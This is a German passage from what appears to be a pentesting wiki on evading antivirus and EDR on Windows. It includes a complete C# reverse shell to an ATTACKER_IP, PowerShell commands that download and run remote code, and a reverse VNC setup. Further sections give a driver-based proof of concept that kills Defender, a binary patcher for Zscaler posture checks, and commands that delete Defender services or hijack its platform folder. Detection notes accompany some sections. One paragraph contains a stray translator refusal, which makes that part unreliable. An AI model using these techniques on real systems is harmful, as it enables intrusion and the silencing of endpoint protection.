https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Auch dies ist ein großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ältere Techniken**

### **Prüfen, welche Teile Defender als schädlich erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile der Binärdatei**, bis es **herausfindet, welcher Teil von Defender** als schädlich erkannt wird, und gibt diesen Teil separat aus.\
Ein weiteres Tool, das **dasselbe tut, ist** [**avred**](https://github.com/dobin/avred). Es bietet den Dienst über eine frei zugängliche Website unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) an.

### **Telnet-Server**

Bis Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den du (als Administrator) wie folgt installieren konntest:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Lass es beim Systemstart **starten** und **führe** es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern** (stealth) und Firewall deaktivieren:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es hier herunter: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du benötigst die Bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege ein Passwort unter _VNC Password_ fest
- Lege ein Passwort unter _View-Only Password_ fest

Verschiebe anschließend die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **Opferrechner**

#### **Reverse-Verbindung**

Der **Angreifer** sollte auf seinem **Host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit sie bereit ist, eine Reverse-**VNC-Verbindung** anzunehmen. Anschließend auf dem **Opferrechner**: Starte den winvnc-Daemon mit `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um Stealth zu wahren, darfst du einige Dinge nicht tun:

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [Popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst wird das [Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet.
- Führe nicht `winvnc -h` aus, um Hilfe aufzurufen, sonst löst du ein [Popup](https://i.imgur.com/oc18wcu.png) aus.

### GreatSCT

Lade es hier herunter: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starte nun **den Listener** mit `msfconsole -r file.rc` und **führe** den **XML-Payload** aus mit:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unsere eigene reverse shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwende es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit Compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel für die Verwendung von Python zum Erstellen von Injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – AV/EDR aus dem Kernel-Modus ausschalten

Storm-2603 nutzte ein kleines Konsolenprogramm namens **Antivirus Terminator**, um den Endpunktschutz zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt einen **eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst durch Protected-Process-Light-(PPL-)AV-Dienste nicht blockiert werden können.<sup>[[12]](#references)</sup>

Wichtige Erkenntnisse
1. **Signierter Treiber**: Die auf dem Datenträger abgelegte Datei heißt `ServiceMouse.sys`, doch bei der Binärdatei handelt es sich um den legitim signierten Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur trägt, wird er auch dann geladen, wenn Driver-Signature-Enforcement (DSE) aktiviert ist.
2. **Dienstinstallation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **Kernel-Dienst**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL code | Fähigkeit                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Einen beliebigen Prozess anhand der PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Eine beliebige Datei auf dem Datenträger löschen |
   | `0x990001D0` | Den Treiber entladen und den Dienst entfernen |

   Minimaler C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Warum es funktioniert**: BYOVD umgeht den Schutz im User-Mode vollständig; im Kernel ausgeführter Code kann *geschützte* Prozesse öffnen, beenden oder Kernel-Objekte manipulieren – unabhängig von PPL/PP, ELAM oder anderen Hardening-Funktionen.

Erkennung / Abwehr  
• Aktivieren Sie Microsofts Sperrliste für anfällige Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verhindert.  
• Überwachen Sie das Erstellen neuer *Kernel*-Dienste und lösen Sie einen Alarm aus, wenn ein Treiber aus einem allgemein beschreibbaren Verzeichnis geladen wird oder nicht auf der Allowlist steht.  
• Achten Sie auf Handles im User-Mode zu benutzerdefinierten Geräteobjekten, auf die verdächtige `DeviceIoControl`-Aufrufe folgen.

### Umgehung der Zscaler Client Connector-Posture-Prüfungen durch Patching von Binärdateien auf dem Datenträger

Zscaler’s **Client Connector** wendet Device-Posture-Regeln lokal an und nutzt Windows RPC, um die Ergebnisse an andere Komponenten zu übermitteln. Zwei schwache Designentscheidungen ermöglichen eine vollständige Umgehung:

1. Die Posture-Prüfung erfolgt **vollständig clientseitig** (ein Boolean wird an den Server gesendet).
2. Interne RPC-Endpunkte prüfen lediglich, ob die verbindende ausführbare Datei **von Zscaler signiert** ist (über `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Durch **Patching von vier signierten Binärdateien auf dem Datenträger** lassen sich beide Mechanismen außer Kraft setzen:

| Binärdatei | Gepatchte ursprüngliche Logik | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch ein nicht signierter) kann sich mit den RPC-Pipes verbinden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Auszug eines minimalen Patchers:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nach dem Ersetzen der Originaldateien und dem Neustart des Dienst-Stacks:

* **Alle** posture checks werden als **grün/konform** angezeigt.
* Nicht signierte oder veränderte Binärdateien können die benannten Pipe-RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das durch die Zscaler-Richtlinien definierte interne Netzwerk.

Diese Fallstudie zeigt, wie sich rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches umgehen lassen.

## Missbrauch vertrauenswürdiger Funktionen von Microsoft Defender `BTR.sys`

Der **Boot-Time Removal**-Treiber von Defender ist ein nützliches Gegenbeispiel zu klassischem BYOVD. `BTR.sys` ist eine legitime, von Microsoft signierte Remediation-Komponente ohne Speicherbeschädigungsfehler und ohne IOCTL-Schnittstelle; nachdem Administratorzugriff und `SeLoadDriverPrivilege` erlangt wurden, kann ein Operator stattdessen die private Remediation-Transaktion fälschen und so bestimmungsgemäße Datei-/Registrierungsoperationen auf Ring 0 ausführen. Dies ist eine **Primitive zur Neutralisierung von AV/EDR nach einer Kompromittierung, kein Initialzugriff und keine Rechteausweitung**. Außerdem lässt sich der Treiber aus der `BOOTTIMETOOL`-Ressource der eigenen `MpEngine.dll` des Ziels extrahieren, statt einen auffälligen Treiber eines Drittanbieters einzuschleusen.<sup>[[36]](#references)</sup>

### Bereitstellen des One-Shot-Treibers

Defender legt die Ressource normalerweise als Datei mit einem zufälligen Namen im Format `[a-z]{8}.sys` ab und registriert einen entsprechend benannten Kernel-Dienst. `DriverEntry` liest den Wert `Args` des Dienstes, öffnet den referenzierten NTFS ADS, entschlüsselt und validiert die Aktionsliste, schreibt Feedback und gibt nach erfolgreicher Ausführung `0xC0000056` (`STATUS_DELETE_PENDING`) zurück, sodass der Treiber entladen wird, statt resident zu bleiben. Ein gefälschter Dienst weist die folgenden charakteristischen Werte auf.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Der `:changelist`-Stream enthält einen RC4-verschlüsselten Blob. Die analysierten Builds verwenden denselben festen 256-Byte-Schlüssel, daher ist die Verschlüsselung keine Autorisierungsgrenze. Ein gültiger Klartext besteht aus einem 24-Byte-Global-Header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, Header-CRC und einer aus der Payload abgeleiteten Transaktions-ID), gefolgt von einem nullterminierten UTF-16-Feedback-Pfad und beliebig vielen Elementen. Jedes Element hat einen 16-Byte-Header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) sowie aktionsspezifische Daten, die mit **genau vier NUL-Bytes** enden. Jeder Header- und Datenbereich wird unabhängig mit dem CRC-32-Polynom `0xEDB88320`, dem Anfangszustand `0xFFFFFFFF` und **ohne abschließendes XOR** (`~CRC32`) geprüft; der CRC-Zustand wird für jeden Bereich zurückgesetzt.<sup>[[36]](#references)[[37]](#references)</sup>

Die akzeptierten Aktions-IDs legen folgende Kernel-Primitive offen.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Elementdaten | Ergebnis |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Eine Datei löschen, auch wenn sie gesperrt ist |
| 2 | `[UTF-16 path]` | Ein leeres Verzeichnis entfernen |
| 3 | `[Flags][source][destination]` | Eine Datei in einen vom Angreifer ausgewählten geschützten Pfad verschieben; ein leeres Ziel bedeutet Löschen |
| 4 | `[Flags][key path]` | Einen Registrierungsschlüssel rekursiv löschen |
| 5 | `[Flags][key path + "\\" + value]` | Einen Registrierungswert löschen |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Einen Registrierungswert erstellen/aktualisieren und fehlende Schlüsselpfade erstellen |

Bei den Aktionen 5 und 6 besteht das Trennzeichen zwischen Schlüssel und Wert auf dem Draht aus **zwei aufeinanderfolgenden Backslashes**; ein konventionell formatierter Pfad wird nicht korrekt aufgeteilt. Die Feedback-Datei spiegelt größtenteils die Anfrage wider, aber die ersten vier Datenbytes jedes Elements werden zu dessen resultierendem `NTSTATUS`. Bei den Aktionen 1 und 2, die kein führendes Flags-Feld haben, verschiebt BTR den Pfad in die vier reservierten abschließenden Bytes, um Platz für diesen Status zu schaffen.<sup>[[36]](#references)</sup>

### `BTR_CLI`-Ablauf und Zeitfenster beim frühen Systemstart

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementiert die gesamte Kette: `BTR.sys` aus dem lokalen Defender extrahieren, `<random>.sys:changelist` und einen Feedback-Stream erstellen, verkettete Aktionen serialisieren, Prüfsummen berechnen und verschlüsseln, den Dienst-Registrierungsschlüssel direkt erstellen und anschließend für `-trigger now` `NtLoadDriver` aufrufen oder den Treiber für `-trigger boot` als Systemstart-Treiber belassen. Die direkte Bereitstellung über die Registrierung umgeht den normalen SCM-Pfad `CreateServiceW` und erzeugt daher **kein Dienstinstallationsereignis mit der ID 7045**. Artefakte, die beim Systemstart ausgelöst werden, können später mit `BTR_CLI.exe -cleanup <service_name>` entfernt werden.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` ist nicht verwendbar, da BTR bereits vor der Initialisierung des Storage-Stacks und des `SystemRoot`-Links Datei-E/A aus `DriverEntry` ausführt. `Start=1` mit der hoch priorisierten Gruppe `Boot Bus Extender` wird dagegen in Phase 1 ausgeführt: NTFS ist verwendbar, aber viele sicherheitsrelevante Treiber mit Systemstart und EDR-Dienste im User Mode wurden noch nicht initialisiert. Boot-Start-Filter wie `WdFilter` sind möglicherweise bereits geladen. BTR kann jedoch ihre Binärdateien oder Dienstkonfiguration vor dem nächsten Start entfernen und Dienstprogramme löschen, bevor SCM sie startet. ELAM schließt diese Lücke nicht, da BTR nach der Boot-Start-Auswertung ausgeführt wird und eine gültige Microsoft-Signatur trägt.<sup>[[36]](#references)</sup>

Mehrere Aktionen werden in einer Transaktion ausgeführt. Der PoC fügt Action 1 für die fest codierte Datei `\SystemRoot\Temp\BootClean.log` voran: BTR erstellt diese Protokolldatei, führt dann seinen eigenen Löschauftrag aus und entfernt sie vor dem Entladen. Das reduziert die Spuren. Werden Rückmeldungen in `<random>.sys:<random>.dat` gespeichert, lassen sich der Treiber und beide Streams gemeinsam entfernen.<sup>[[36]](#references)[[37]](#references)</sup>

### Korrelationen mit hoher Signalstärke zur Erkennung

Regeln, die nur Signaturen prüfen, und die Microsoft-Sperrliste für anfällige Treiber verhindern keinen Missbrauch der vorgesehenen BTR-Funktionalität. Bevorzuge die folgenden verhaltensbasierten Korrelationen und unterscheide dabei die legitime Defender-Herkunft von einem beliebigen Launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Die Erstellung von `.sys:changelist` ist bei BTR-Staging universell. Ein `.dat`-ADS am selben `.sys` ist besonders verdächtig, da Defender Rückmeldungen normalerweise unter `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` speichert.
- **Sysmon 12/13 ohne System 7045:** Korreliere die direkte Erstellung von `HKLM\SYSTEM\CurrentControlSet\Services\<random>` mit `Args=...:changelist` und `Group=Boot Bus Extender`, wenn kein passendes SCM-Installationsereignis vorliegt.
- **Sysmon 6 -> 23:** Korreliere das Laden eines bekannten BTR-Treibers aus einer Nicht-Defender-Herkunft mit anschließender Dateilöschung durch `System`/PID 4, insbesondere bei Sicherheitsbinärdateien.
- **Sysmon 11 -> 23:** Melde die schnelle Erstellung und Löschung von `\SystemRoot\Temp\BootClean.log` durch `System`/PID 4.
- Beschränke und protokolliere die Zuweisung und Aktivierung von `SeLoadDriverPrivilege`. Eine Microsoft-Signatur allein reicht nicht als Vertrauensnachweis, wenn ein Treiber eines Sicherheitstools von `cmd.exe`, PowerShell oder einem unbekannten Prozess bereitgestellt wird.

## Protected Process Light (PPL) missbrauchen, um AV/EDR mit LOLBINs zu manipulieren

Protected Process Light (PPL) erzwingt eine Hierarchie aus Signierern und Schutzstufen, sodass nur gleich oder höher geschützte Prozesse einander manipulieren können. Aus offensiver Sicht kannst du, wenn du eine PPL-fähige Binärdatei rechtmäßig starten und ihre Argumente kontrollieren kannst, eine harmlose Funktion (z. B. Protokollierung) in eine eingeschränkte, durch PPL geschützte Schreibmöglichkeit für geschützte Verzeichnisse von AV/EDR umwandeln.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Was einen Prozess als PPL ausführt
- Die Ziel-EXE (und alle geladenen DLLs) muss mit einer PPL-fähigen EKU signiert sein.
- Der Prozess muss mit `CreateProcess` und den Flags `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` erstellt werden.
- Es muss eine kompatible Schutzstufe angefordert werden, die zur Signatur der Binärdatei passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signierer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signierer). Bei falschen Stufen schlägt die Erstellung fehl.

Eine allgemeinere Einführung in PP/PPL und den LSASS-Schutz findest du hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Hilfsprogramm: CreateProcessAsPPL (wählt die Schutzstufe aus und leitet Argumente an die Ziel-EXE weiter):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Verwendungsmuster:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Der Text beschreibt eine Methode, eine signierte Windows-Systemdatei mit PPL-Rechten zum Schreiben in geschützte Defender-Verzeichnisse zu missbrauchen und dadurch den Virenschutz beim Systemstart zu beschädigen. Die konkreten Befehle und Schritte zum Umgehen des Schutzes kann ich nicht übersetzen. Zur Abwehr sollten Änderungen an Defender-Dateien überwacht und unerwartete Autostart-Dienste geprüft werden.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Hinweise und Einschränkungen
- Du kannst den Inhalt, den ClipUp schreibt, nicht beeinflussen, sondern nur den Speicherort; die Primitive eignet sich für Beschädigungen, nicht für das präzise Einschleusen von Inhalten.
- Zum Installieren/Starten eines Dienstes und für einen Neustartzeitraum sind lokale Administratorrechte/SYSTEM erforderlich.
- Das Timing ist entscheidend: Das Ziel darf nicht geöffnet sein; die Ausführung beim Booten vermeidet Dateisperren.

Erkennungen
- Prozesserstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, insbesondere wenn der übergeordnete Prozess ein nicht standardmäßiger Launcher ist, rund um den Bootvorgang.
- Neue Dienste, die so konfiguriert sind, dass sie verdächtige Binärdateien automatisch starten und regelmäßig vor Defender/AV starten. Untersuche die Erstellung/Änderung von Diensten vor Fehlern beim Start von Defender.
- Dateiintegritätsüberwachung für Defender-Binärdateien/Platform-Verzeichnisse; unerwartete Dateierstellungen/-änderungen durch Prozesse mit Protected-Process-Flags.
- ETW/EDR-Telemetrie: Suche nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomaler PPL-Level-Nutzung durch Nicht-AV-Binärdateien.

Abwehrmaßnahmen
- WDAC/Code Integrity: Beschränke, welche signierten Binärdateien als PPL ausgeführt werden dürfen und unter welchen übergeordneten Prozessen; blockiere ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Diensthygiene: Beschränke die Erstellung/Änderung automatisch startender Dienste und überwache Manipulationen der Startreihenfolge.
- Stelle sicher, dass der Manipulationsschutz von Defender und der Frühstartschutz aktiviert sind; untersuche Startfehler, die auf eine Beschädigung von Binärdateien hindeuten.
- Erwäge, die Erzeugung von 8.3-Kurznamen auf Volumes mit Sicherheitstools zu deaktivieren, sofern dies mit deiner Umgebung kompatibel ist (gründlich testen).

## Manipulation von Microsoft Defender durch einen Symlink-Hijack des Platform-Versionsordners

Windows Defender wählt die Plattform, von der es ausgeführt wird, indem es die Unterordner in folgendem Verzeichnis auflistet:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Es wählt den Unterordner mit der lexikografisch höchsten Versionszeichenfolge (z. B. `4.18.25070.5-0`) aus und startet anschließend die Defender-Dienstprozesse von dort (wobei Dienst-/Registrierungspfade entsprechend aktualisiert werden). Diese Auswahl vertraut Verzeichniseinträgen, einschließlich Verzeichnis-Reparse-Points (Symlinks). Ein Administrator kann dies ausnutzen, um Defender auf einen vom Angreifer beschreibbaren Pfad umzuleiten und DLL sideloading oder eine Dienstunterbrechung zu erreichen.<sup>[[21]](#references)[[22]](#references)</sup>

Voraussetzungen
- Lokaler Administrator (erforderlich, um Verzeichnisse/Symlinks im Platform-Ordner zu erstellen)
- Möglichkeit, einen Neustart durchzuführen oder eine erneute Auswahl der Defender-Plattform auszulösen (Neustart des Dienstes beim Booten)
- Es sind nur integrierte Tools erforderlich (`mklink`)

Warum es funktioniert
- Defender blockiert Schreibvorgänge in seinen eigenen Ordnern, aber bei der Auswahl seiner Plattform vertraut es Verzeichniseinträgen und wählt die lexikografisch höchste Version aus, ohne zu überprüfen, ob das Ziel auf einen geschützten/vertrauenswürdigen Pfad verweist.

Schritt für Schritt (Beispiel)
1) Erstelle einen beschreibbaren Klon des aktuellen Plattformordners, z. B. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Erstelle innerhalb von Platform einen Verzeichnis-Symlink mit höherer Versionsnummer, der auf deinen Ordner verweist:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Trigger-Auswahl (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, ob MsMpEng.exe (WinDefend) über den umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` sowie die Dienstkonfiguration/Registry beobachten, die diesen Speicherort widerspiegeln.

Post-Exploitation-Optionen
- DLL-Sideloading/Codeausführung: DLLs ablegen/ersetzen, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den obigen Abschnitt: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Dienstbeendigung/Denial: Den Versions-Symlink entfernen, damit der konfigurierte Pfad beim nächsten Start nicht aufgelöst werden kann und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Beachte, dass diese Technik allein keine Rechteausweitung ermöglicht; sie erfordert Administratorrechte.

